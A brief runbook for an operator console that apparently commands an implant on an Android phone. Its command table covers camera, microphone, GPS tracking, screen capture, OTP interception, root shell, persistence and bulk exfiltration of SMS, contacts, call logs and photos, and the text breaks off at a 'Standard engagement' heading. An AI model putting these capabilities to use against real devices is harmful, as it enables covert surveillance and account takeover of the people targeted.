# Runbook

Console: open `operator/index.html`, load your private key, `/use <device>`.

| Command | Effect |
|---|---|
| `/status` | Model, build, patch, rung, permission state |
| `/recon system\|patch\|perms\|privacy\|apps\|net\|selinux\|boot` | Posture probe |
| `/cam snap front\|rear [burst]` | Still capture |
| `/cam stream [ms]` / `/cam stream stop` | Continuous capture |
| `/cam clip <secs>` | Video |
| `/loc once` / `/loc track` / `/loc history` | GPS |
| `/mic <secs>` | Audio |
| `/screen start` / `/screen stop` | Projection frames (one tap on first start) |
| `/otp on\|off` / `/otp-dump` | OTP capture control and dump |
| `/a11y` / `/click <path>` | Screen tree / click node |
| `/web open\|eval\|dump` | WebView probe |
| `/knox probe\|persona\|policy\|attest` | Knox enumeration |
| `/shell <cmd>` | Root/shell |
| `/exfil sms\|contacts\|calllog\|calendar\|photos` | Bulk pull |
| `/persist status\|rearm\|doze-exempt\|battery` | Persistence control |
| `/exploit scan` | Differential hunt |
| `/report md` | Report assembly |
| `/audit [n]` / `/verify` | Audit tail / chain verify |
| `/ping` / `/kill` | Heartbeat / stop |

## Standard engagement
